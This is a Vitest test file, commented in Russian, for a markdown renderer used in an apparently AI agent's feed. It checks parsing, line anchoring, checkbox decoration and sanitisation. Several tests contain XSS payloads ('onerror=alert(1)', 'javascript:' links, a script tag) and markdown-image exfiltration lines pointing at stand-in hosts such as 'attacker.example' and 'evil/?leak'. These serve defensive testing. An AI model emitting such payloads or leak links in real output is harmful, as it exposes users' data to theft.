import { describe, expect, test } from 'vitest'
import {
  escapeHtml,
  isHeading2,
  isSpecialSection,
  renderAnchoredSections,
  renderMarkdown,
  renderPlainMarkdown,
  type Section,
} from './markdown'

// Покрытие поведенческого порта markdown-рендера из app.js (renderMarkdownHTML + decorate*).
// Функции чистые — DOM/fetch не нужен.

// renderPlainMarkdown — нейтральный рендерер для ленты: тот же markdown-it, но БЕЗ
// plan-специфики (спец-секции, decorateCheckboxes). Именно его использует нарратив
// агента в FeedWorkspace.
describe('renderPlainMarkdown', () => {
  test('пустой ввод возвращает пустую строку', () => {
    expect(renderPlainMarkdown('')).toBe('')
    expect(renderPlainMarkdown('   \n  ')).toBe('')
  })

  test('рендерит блочный markdown: заголовок, жирный, inline code, таблицу', () => {
    const html = renderPlainMarkdown(
      '## Итог\n\n**жирно** и `code`\n\n| a | b |\n|---|---|\n| 1 | 2 |',
    )
    expect(html).toContain('<h2>')
    expect(html).toContain('<strong>жирно</strong>')
    expect(html).toContain('<code>code</code>')
    expect(html).toContain('<table>')
    expect(html).toContain('<th>a</th>')
    expect(html).toContain('<td>1</td>')
  })

  test('НЕ применяет plan-специфику: спецсекции и decorateCheckboxes', () => {
    const html = renderPlainMarkdown('## Assumptions\n- none\n\n- [x] done `[x]` inside')
    // спец-секция плана не оборачивается
    expect(html).not.toContain('plan-section-wrapper')
    expect(html).toContain('<h2>Assumptions</h2>')
    // чекбоксы не декорируются (в т.ч. внутри inline code)
    expect(html).not.toContain('cb-done')
    expect(html).not.toContain('cb-open')
  })

  test('безопасность: raw HTML экранируется, javascript:-ссылка не становится href', () => {
    const imgHtml = renderPlainMarkdown('<img src=x onerror=alert(1)>')
    expect(imgHtml).not.toContain('<img')
    expect(imgHtml).toContain('&lt;img')
    const linkHtml = renderPlainMarkdown('[x](javascript:alert(1))')
    expect(linkHtml).not.toContain('href="javascript:')
  })

  // Глушение внешних markdown-картинок: канал эксфильтрации `![](https://…/?leak)`
  // не должен эмитить внешний <img>. Оставляем только alt-текст.
  test('внешняя markdown-картинка НЕ создаёт <img>, остаётся alt-текст', () => {
    const html = renderPlainMarkdown('![secret alt](http://evil/?leak)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('evil')
    expect(html).toContain('secret alt')
  })

  test('внешняя https-картинка тоже глушится', () => {
    const html = renderPlainMarkdown('![a](https://attacker.example/pixel.png)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('attacker.example')
  })

  test('protocol-relative //host картинка глушится (не начинается с одного "/")', () => {
    const html = renderPlainMarkdown('![a](//evil/x.png)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('evil')
  })

  test('относительная/абсолютная (/-префикс) картинка всё ещё рендерится', () => {
    const html = renderPlainMarkdown('![chart](/api/stages/s1/artifacts/chart.png)')
    expect(html).toContain('<img')
    expect(html).toContain('src="/api/stages/s1/artifacts/chart.png"')
    expect(html).toContain('alt="chart"')
  })

  // Относительные ссылки БЕЗ ведущего "/" (`rel/path`, `./x`, `../x`) — тоже
  // same-origin, рендерились и раньше: глушим только схему и protocol-relative.
  test.each([
    ['relative path', '![c](images/chart.png)', 'images/chart.png'],
    ['dot-slash', '![c](./chart.png)', './chart.png'],
    ['dot-dot', '![c](../assets/chart.png)', '../assets/chart.png'],
  ])('относительная %s рендерится', (_name, md, wantSrc) => {
    const html = renderPlainMarkdown(md)
    expect(html).toContain('<img')
    expect(html).toContain(`src="${wantSrc}"`)
  })

  test('data:-картинка глушится (явная схема, не эмитим <img>)', () => {
    const html = renderPlainMarkdown('![a](data:image/png;base64,AAAA)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('base64')
  })

  test('alt-текст внешней картинки экранируется (без инъекции)', () => {
    const html = renderPlainMarkdown('![<b>&x](http://evil/)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('<b>')
    expect(html).toContain('&lt;b&gt;')
  })
})

describe('renderMarkdown', () => {
  test('пустой ввод возвращает пустую строку', () => {
    expect(renderMarkdown('')).toBe('')
    expect(renderMarkdown('   \n  ')).toBe('')
  })

  test('рендерит параграф', () => {
    expect(renderMarkdown('Hello world')).toContain('<p>Hello world</p>')
  })

  test('декорирует чекбоксы [x]/[ ]', () => {
    const html = renderMarkdown('- [x] done\n- [ ] todo')
    expect(html).toContain('cb cb-done')
    expect(html).toContain('cb cb-open')
  })

  test('оборачивает спецсекции в сворачиваемые обёртки и закрывает их', () => {
    const html = renderMarkdown('## Assumptions\n- none\n## Acceptance Criteria\n- one')
    expect(html).toContain('plan-section-wrapper plan-section-assumptions')
    expect(html).toContain('plan-section-wrapper plan-section-criteria')
    expect(html).toContain('⚠ Assumptions')
    expect(html).toContain('✓ Acceptance Criteria')
    // обе обёртки должны быть закрыты (</div></div> на каждую)
    expect((html.match(/<\/div><\/div>/g) ?? []).length).toBe(2)
  })

  test('сохраняет fenced code-блоки', () => {
    const html = renderMarkdown('```\ncode line\n```')
    expect(html).toContain('code line')
    expect(html).toContain('<code>')
  })
})

// renderAnchoredSections — anchored-рендер (один парс, срезы токенов, аннотация
// data-line на под-элементах). Главная гарантия — «не развалить markdown»:
// структурная целостность списков/таблиц/цитат + УНИКАЛЬНАЯ стартовая строка у
// каждого якоря (НЕ биекция со всеми строками).
describe('renderAnchoredSections', () => {
  // Собирает весь html всех блоков всех секций.
  const allHtml = (sections: Section[]): string =>
    sections.flatMap((s) => s.blocks).map((b) => b.html).join('\n')

  // Все data-line-номера в порядке появления (и на под-элементах, и на fence-обёртке).
  const dataLines = (html: string): number[] =>
    [...html.matchAll(/data-line="(\d+)"/g)].map((m) => Number(m[1]))

  test('пустой ввод → пустой массив секций (оба режима)', () => {
    expect(renderAnchoredSections('', { specialSections: true })).toEqual([])
    expect(renderAnchoredSections('   \n  ', { specialSections: false })).toEqual([])
  })

  // ── Структурная целостность markdown ──────────────────────────────────────

  test('<ol> продолжает нумерацию (start="2")', () => {
    const html = allHtml(renderAnchoredSections('2. first\n3. second', { specialSections: false }))
    expect(html).toContain('<ol start="2">')
    expect(html).toContain('<li')
  })

  test('tight-список: один блок, якорь на каждом <li> внутри <ul>', () => {
    const sections = renderAnchoredSections('- a\n- b', { specialSections: false })
    expect(sections).toHaveLength(1)
    const blocks = sections[0]!.blocks
    expect(blocks).toHaveLength(1)
    expect(blocks[0]).toMatchObject({ startLine: 1, endLineExclusive: 3 })
    expect(blocks[0]!.html).toContain('<ul>')
    // Якоря именно на <li>, не на <ul> (списки/таблицы якорят под-элементы).
    expect(blocks[0]!.html).toMatch(/<li data-line="1"/)
    expect(blocks[0]!.html).toMatch(/<li data-line="2"/)
    expect(dataLines(blocks[0]!.html)).toEqual([1, 2])
  })

  test('loose-список: 2-й пункт — свой якорь на своей строке', () => {
    const html = allHtml(renderAnchoredSections('- a\n\n- b', { specialSections: false }))
    expect(dataLines(html)).toEqual([1, 3])
  })

  test('вложенный список: внешний + вложенный li + следующий — три якоря', () => {
    const html = allHtml(
      renderAnchoredSections('- a\n  - nested\n- b', { specialSections: false }),
    )
    expect(dataLines(html)).toEqual([1, 2, 3])
    expect(html).toContain('nested')
    // Ровно два <ul> — внешний и один вложенный (без повторного рендера).
    expect((html.match(/<ul>/g) ?? []).length).toBe(2)
  })

  test('смешанные блоки (список + список) — каждый свой блок', () => {
    const sections = renderAnchoredSections('1. a\n2. b\n\n- c\n- d', { specialSections: false })
    expect(sections).toHaveLength(1)
    const blocks = sections[0]!.blocks
    expect(blocks).toHaveLength(2)
    expect(blocks[0]!.html).toContain('<ol')
    expect(blocks[1]!.html).toContain('<ul>')
    // Глобальные номера строк: второй список стартует на строке 4.
    expect(dataLines(blocks[1]!.html)).toEqual([4, 5])
  })

  test('<li> только внутри ul/ol (заголовок/параграф якорится сам, не как li)', () => {
    const html = allHtml(renderAnchoredSections('# Title\n\npara', { specialSections: false }))
    expect(html).not.toContain('<li')
    expect(html).toMatch(/<h1 data-line="1"/)
    expect(html).toMatch(/<p data-line="3"/)
  })

  test('<tr> только внутри thead/tbody; якоря на header-tr и data-tr', () => {
    const sections = renderAnchoredSections('| A | B |\n|---|---|\n| 1 | 2 |', {
      specialSections: false,
    })
    const blocks = sections[0]!.blocks
    expect(blocks).toHaveLength(1)
    const html = blocks[0]!.html
    expect(html).toContain('<table>')
    expect(html).toContain('<thead>')
    expect(html).toContain('<tbody>')
    expect(html).not.toContain('<li')
    expect(html).toMatch(/<tr data-line="1"/) // header row
    expect(html).toMatch(/<tr data-line="3"/) // data row
    expect(dataLines(html)).toEqual([1, 3])
    // Разделитель |---| (строка 2) якоря не имеет.
    expect(html).not.toContain('data-line="2"')
  })

  test('таблица без header-разделителя → параграф → якорь-параграф', () => {
    const html = allHtml(renderAnchoredSections('value | with pipe', { specialSections: false }))
    expect(html).not.toContain('<table>')
    expect(html).toMatch(/<p data-line="1"/)
    expect(dataLines(html)).toEqual([1])
  })

  test('несколько параграфов в blockquote — каждый свой якорь на своей строке', () => {
    const html = allHtml(renderAnchoredSections('> p1\n>\n> p2', { specialSections: false }))
    expect(html).toContain('<blockquote')
    // Первая строка — внешний blockquote (коллизия с 1-м абзацем → внешний);
    // 2-й абзац на строке 3 — свой якорь.
    expect(dataLines(html)).toEqual([1, 3])
  })

  test('fence: один якорь на <div class="md-fence-anchor"> вокруг <pre>', () => {
    const html = allHtml(
      renderAnchoredSections('```js\nconst x = 1\n```', { specialSections: false }),
    )
    expect(html).toContain('<div class="md-fence-anchor" data-line="1"')
    expect(html).toContain('<pre>')
    expect(html).toContain('const x = 1')
    expect(dataLines(html)).toEqual([1])
  })

  test('indented code: один якорь на fence-обёртке', () => {
    const html = allHtml(
      renderAnchoredSections('    indented code\n    line two', { specialSections: false }),
    )
    expect(html).toContain('md-fence-anchor')
    expect(html).toContain('<pre>')
    expect(dataLines(html)).toEqual([1])
  })

  test('ссылки сохраняют target=_blank / rel=noopener', () => {
    const html = allHtml(renderAnchoredSections('See [link](/path).', { specialSections: false }))
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener"')
    expect(html).toContain('href="/path"')
  })

  test('reference-def ВНЕ блока + ссылка ВНУТРИ — резолвится (один parse)', () => {
    const sections = renderAnchoredSections('[ref]: /target\n\nSee [link][ref].', {
      specialSections: false,
    })
    const html = allHtml(sections)
    expect(html).toContain('href="/target"')
    // Глобальные номера строк: reference-def токенов не даёт, параграф на строке 3.
    expect(dataLines(html)).toEqual([3])
  })

  // ── Коллизии (несколько кандидатов на одной строке → самый внешний) ────────

  test('коллизия "- # H" → один внешний якорь на <li>', () => {
    const html = allHtml(renderAnchoredSections('- # H', { specialSections: false }))
    expect(dataLines(html)).toEqual([1])
    expect(html).toMatch(/<li data-line="1"/)
    expect(html).toContain('<h1>H</h1>')
  })

  test('коллизия "1. # H" → один внешний якорь на <li> в <ol>', () => {
    const html = allHtml(renderAnchoredSections('1. # H', { specialSections: false }))
    expect(dataLines(html)).toEqual([1])
    expect(html).toContain('<ol>')
    expect(html).toMatch(/<li data-line="1"/)
  })

  test('коллизия "- > quote" → один внешний якорь на <li>', () => {
    const html = allHtml(renderAnchoredSections('- > quote', { specialSections: false }))
    expect(dataLines(html)).toEqual([1])
    expect(html).toMatch(/<li data-line="1"/)
    expect(html).toContain('<blockquote')
  })

  test('коллизия li+fence на одной строке → один внешний якорь (fence не оборачивается)', () => {
    const html = allHtml(
      renderAnchoredSections('- ```\n  code\n  ```', { specialSections: false }),
    )
    expect(dataLines(html)).toEqual([1])
    expect(html).toMatch(/<li data-line="1"/)
    // fence не выбран якорем → wrapper-обёртки нет.
    expect(html).not.toContain('md-fence-anchor')
  })

  test('setext-заголовок → якорь на первой строке (подчёркивание якоря не имеет)', () => {
    const html = allHtml(
      renderAnchoredSections('Title\n=====\n\nbody', { specialSections: false }),
    )
    expect(html).toMatch(/<h1 data-line="1"/)
    expect(dataLines(html)).toEqual([1, 4])
  })

  // ── Чекбоксы (token-aware, с сохранением экранирования) ────────────────────

  test('чекбоксы декорируются в тексте', () => {
    const html = allHtml(renderAnchoredSections('- [x] done\n- [ ] todo', { specialSections: false }))
    expect(html).toContain('cb cb-done')
    expect(html).toContain('cb cb-open')
  })

  test('чекбокс НЕ декорируется внутри fence', () => {
    const html = allHtml(
      renderAnchoredSections('```\n[x] not a checkbox\n```', { specialSections: false }),
    )
    expect(html).not.toContain('cb-done')
    expect(html).toContain('[x]')
  })

  test('чекбокс НЕ декорируется внутри inline-code', () => {
    const html = allHtml(renderAnchoredSections('text `[x]` more', { specialSections: false }))
    expect(html).not.toContain('cb-done')
    expect(html).toContain('<code>[x]</code>')
  })

  test('экранирование сохраняется: <b> экранируется, [x] рядом декорируется', () => {
    const html = allHtml(renderAnchoredSections('use <b>bold</b> [x]', { specialSections: false }))
    expect(html).toContain('&lt;b&gt;')
    expect(html).not.toContain('<b>')
    expect(html).toContain('cb cb-done')
  })

  test('\\[x] неотличимо от [x] (документированное ограничение) → декорируется', () => {
    const html = allHtml(renderAnchoredSections('value \\[x] here', { specialSections: false }))
    expect(html).toContain('cb cb-done')
  })

  // ── Спец-секции (режим Plan/Dialog) ────────────────────────────────────────

  test('Plan-режим: спец-секция со списком — заголовок вырезан, блоки внутри секции', () => {
    const sections = renderAnchoredSections('## Assumptions\n\n- a\n- b', { specialSections: true })
    expect(sections).toHaveLength(1)
    expect(sections[0]!.kind).toBe('special')
    expect(sections[0]!.special?.label).toBe('Assumptions')
    const html = allHtml(sections)
    expect(html).not.toContain('Assumptions') // заголовок вырезан
    expect(html).toContain('<ul>')
    // Глобальные номера строк: список внутри секции стартует на строке 3.
    expect(dataLines(html)).toEqual([3, 4])
  })

  test('Plan-режим: спец-секция с таблицей', () => {
    const sections = renderAnchoredSections(
      '## Acceptance Criteria\n\n| A | B |\n|---|---|\n| 1 | 2 |',
      { specialSections: true },
    )
    expect(sections).toHaveLength(1)
    expect(sections[0]!.kind).toBe('special')
    expect(sections[0]!.special?.label).toBe('Acceptance Criteria')
    const html = allHtml(sections)
    expect(html).toContain('<table>')
    // tr на строках 3 (header) и 5 (data).
    expect(dataLines(html)).toEqual([3, 5])
  })

  test('Plan-режим: special → ## Other → content (## Other закрывает секцию и рендерится)', () => {
    const sections = renderAnchoredSections(
      '## Assumptions\n\n- a\n\n## Other\n\n- b',
      { specialSections: true },
    )
    expect(sections).toHaveLength(2)
    expect(sections[0]!.kind).toBe('special')
    expect(sections[0]!.special?.label).toBe('Assumptions')
    expect(sections[1]!.kind).toBe('plain')
    const plainHtml = sections[1]!.blocks.map((b) => b.html).join('')
    // ## Other рендерится нормально (не вырезан, не спец).
    expect(plainHtml).toContain('Other')
    expect(plainHtml).toContain('<h2')
  })

  test('Dialog-режим (specialSections:false): заголовок спец-секции НЕ вырезается', () => {
    const sections = renderAnchoredSections('## Assumptions\n\n- a', { specialSections: false })
    expect(sections).toHaveLength(1)
    expect(sections[0]!.kind).toBe('plain')
    const html = allHtml(sections)
    expect(html).toContain('Assumptions') // заголовок на месте
    expect(html).toContain('<h2')
  })

  // ── XSS / безопасность ──────────────────────────────────────────────────────

  test('XSS: html:false — raw <img> экранируется', () => {
    const html = allHtml(
      renderAnchoredSections('<img src=x onerror=alert(1)>', { specialSections: false }),
    )
    expect(html).not.toContain('<img')
    expect(html).toContain('&lt;img')
  })

  test('XSS: опасный URL javascript: не становится href', () => {
    const html = allHtml(
      renderAnchoredSections('[click](javascript:alert(1))', { specialSections: false }),
    )
    expect(html).not.toContain('href="javascript:')
  })

  test('XSS: fence info не инъектится сырым HTML', () => {
    const html = allHtml(
      renderAnchoredSections('```<script>alert(1)</script>\ncode\n```', { specialSections: false }),
    )
    expect(html).not.toContain('<script>')
    expect(html).toContain('md-fence-anchor')
  })

  test('внешняя markdown-картинка глушится (только alt-текст, без <img>)', () => {
    const html = allHtml(
      renderAnchoredSections('![secret](http://evil/?leak)', { specialSections: false }),
    )
    expect(html).not.toContain('<img')
    expect(html).not.toContain('evil')
    expect(html).toContain('secret')
  })

  test('относительная same-origin картинка всё ещё рендерится', () => {
    const html = allHtml(
      renderAnchoredSections('![chart](/api/chart.png)', { specialSections: false }),
    )
    expect(html).toContain('<img')
    expect(html).toContain('src="/api/chart.png"')
  })
})

describe('escapeHtml', () => {
  test('экранирует &, <, >', () => {
    expect(escapeHtml('a & b < c > d')).toBe('a &amp; b &lt; c &gt; d')
  })
})

describe('хелперы секций', () => {
  test('isSpecialSection опознаёт известные секции и отбрасывает прочие', () => {
    expect(isSpecialSection('## Assumptions')?.label).toBe('Assumptions')
    expect(isSpecialSection('## Acceptance Criteria')?.label).toBe('Acceptance Criteria')
    expect(isSpecialSection('## Other')).toBeNull()
  })

  test('isHeading2 срабатывает только на строки вида "## …"', () => {
    expect(isHeading2('## Heading')).toBe(true)
    expect(isHeading2('### Not h2')).toBe(false)
    expect(isHeading2('text')).toBe(false)
  })
})
